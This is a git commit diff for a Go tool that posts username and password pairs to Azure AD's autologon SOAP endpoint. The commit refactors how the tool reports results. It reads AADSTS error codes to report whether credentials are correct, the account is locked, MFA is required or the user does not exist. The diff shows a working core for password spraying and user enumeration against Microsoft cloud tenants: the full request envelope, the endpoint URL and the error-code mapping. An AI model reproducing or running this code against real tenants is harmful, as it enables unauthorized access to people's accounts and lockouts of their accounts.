ac2173b077d4a24598938b4c3f82700aa077f0ec
CristianQS <cristian_31teror@hotmail.com>
2021-11-11 01:29:06 +0000

    Refactor: Rename method, use map, remove duplicity

--- cmd/main.go
+++ cmd/main.go
@@ -5,6 +5,7 @@ import (
 	"encoding/xml"
 	"flag"
 	"fmt"
+	"github.com/google/uuid"
 	"io"
 	"io/ioutil"
 	"log"
@@ -13,8 +14,6 @@ import (
 	"strings"
 	"sync"
 	"time"
-
-	"github.com/google/uuid"
 )
 
 type stringFlag struct {
@@ -55,32 +54,32 @@ func requestAzureActiveDirectory(domain string, user string, password string) {
 	url := "https://autologon.microsoftazuread-sso.com/" + domain + "/winauth/trust/2005/usernamemixed?client-request-id=" + requestid.String()
 	body := strings.NewReader(`<?xml version='1.0' encoding='UTF-8'?>
 <s:Envelope xmlns:s='http://www.w3.org/2003/05/soap-envelope' xmlns:wsse='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-secext-1.0.xsd' xmlns:saml='urn:oasis:names:tc:SAML:1.0:assertion' xmlns:wsp='http://schemas.xmlsoap.org/ws/2004/09/policy' xmlns:wsu='http://docs.oasis-open.org/wss/2004/01/oasis-200401-wss-wssecurity-utility-1.0.xsd' xmlns:wsa='http://www.w3.org/2005/08/addressing' xmlns:wssc='http://schemas.xmlsoap.org/ws/2005/02/sc' xmlns:wst='http://schemas.xmlsoap.org/ws/2005/02/trust' xmlns:ic='http://schemas.xmlsoap.org/ws/2005/05/identity'>
-    <s:Header>
-        <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
-        <wsa:To s:mustUnderstand='1'>` + url + `</wsa:To>
-        <wsa:MessageID>urn:uuid:` + MessageID.String() + `</wsa:MessageID>
-        <wsse:Security s:mustUnderstand="1">
-            <wsu:Timestamp wsu:Id="_0">
-                <wsu:Created>` + creates + `</wsu:Created>
-                <wsu:Expires>` + expires + `</wsu:Expires>
-            </wsu:Timestamp>
-            <wsse:UsernameToken wsu:Id="uuid-` + userID.String() + `">
-                <wsse:Username>` + user + `</wsse:Username>
-                <wsse:Password>` + password + `</wsse:Password>
-            </wsse:UsernameToken>
-        </wsse:Security>
-    </s:Header>
-    <s:Body>
-        <wst:RequestSecurityToken Id='RST0'>
-            <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
-                <wsp:AppliesTo>
-                    <wsa:EndpointReference>
-                        <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
-                    </wsa:EndpointReference>
-                </wsp:AppliesTo>
-                <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
-        </wst:RequestSecurityToken>
-    </s:Body>
+   <s:Header>
+       <wsa:Action s:mustUnderstand='1'>http://schemas.xmlsoap.org/ws/2005/02/trust/RST/Issue</wsa:Action>
+       <wsa:To s:mustUnderstand='1'>` + url + `</wsa:To>
+       <wsa:MessageID>urn:uuid:` + MessageID.String() + `</wsa:MessageID>
+       <wsse:Security s:mustUnderstand="1">
+           <wsu:Timestamp wsu:Id="_0">
+               <wsu:Created>` + creates + `</wsu:Created>
+               <wsu:Expires>` + expires + `</wsu:Expires>
+           </wsu:Timestamp>
+           <wsse:UsernameToken wsu:Id="uuid-` + userID.String() + `">
+               <wsse:Username>` + user + `</wsse:Username>
+               <wsse:Password>` + password + `</wsse:Password>
+           </wsse:UsernameToken>
+       </wsse:Security>
+   </s:Header>
+   <s:Body>
+       <wst:RequestSecurityToken Id='RST0'>
+           <wst:RequestType>http://schemas.xmlsoap.org/ws/2005/02/trust/Issue</wst:RequestType>
+               <wsp:AppliesTo>
+                   <wsa:EndpointReference>
+                       <wsa:Address>urn:federation:MicrosoftOnline</wsa:Address>
+                   </wsa:EndpointReference>
+               </wsp:AppliesTo>
+               <wst:KeyType>http://schemas.xmlsoap.org/ws/2005/05/identity/NoProofKey</wst:KeyType>
+       </wst:RequestSecurityToken>
+   </s:Body>
 </s:Envelope>
 `)
 	// create a request object
@@ -104,10 +103,13 @@ func requestAzureActiveDirectory(domain string, user string, password string) {
 	res.Body.Close()
 	// print response status and body
 	if res.StatusCode != 200 {
-		getResults(getErrorCode(string(data)), user, password)
+		errorCodeMessage := getErrorCodeMessage(getErrorCode(string(data)))
+		errorMessage := fmt.Sprintf("%s:%s -> %s", user, password, errorCodeMessage)
+		fmt.Fprintln(output, errorMessage)
 	} else {
-		fmt.Fprintln(output, user+":"+password+" -> Correct credentials")
+		fmt.Fprintln(output, fmt.Sprintf("%s:%s -> Correct credentials", user, password))
 	}
+
 	defer wg.Done()
 }
 
@@ -172,26 +174,21 @@ func getErrorCode(xmlcode string) string {
 	return errorCode
 }
 
-func getResults(errorCode string, user string, password string) {
-
-	switch {
-	case errorCode == "AADSTS81016":
-		fmt.Fprintln(output, user+":"+password+" -> Invalid STS request")
-	case errorCode == "AADSTS50053":
-		fmt.Fprintln(output, user+":"+password+" -> Locked")
-	case errorCode == "AADSTS50126":
-		fmt.Fprintln(output, user+":"+password+" -> Bad Password")
-	case errorCode == "AADSTS50056":
-		fmt.Fprintln(output, user+":"+password+" -> Exists w/no password")
-	case errorCode == "AADSTS50014":
-		fmt.Fprintln(output, user+":"+password+" -> Exists, but max passthru auth time exceeded")
-	case errorCode == "AADSTS50076":
-		fmt.Fprintln(output, user+":"+password+" -> Need mfa")
-	case errorCode == "AADSTS700016":
-		fmt.Fprintln(output, user+":"+password+" -> No app")
-	case errorCode == "AADSTS50034":
-		fmt.Fprintln(output, user+":"+password+" -> No user")
+func getErrorCodeMessage(errorCode string) string {
+	var errorCodesMessage = map[string]string{
+		"AADSTS81016": "Invalid STS request",
+		"AADSTS50053": "Locked",
+		"AADSTS50126": "Bad Password",
+		"AADSTS50056": "Exists w/no password",
+		"AADSTS50014": "Exists, but max passthru auth time exceeded",
+		"AADSTS50076": "Need mfa",
+		"AADSTS700016": "No app",
+		"AADSTS50034": "No user",
 	}
+	if errorCodeMessage := errorCodesMessage[errorCode]; errorCodeMessage != "" {
+        return errorCodeMessage
+    }
+	return "No error message for ErrorCode: " + errorCode
 }
 
 func init() {
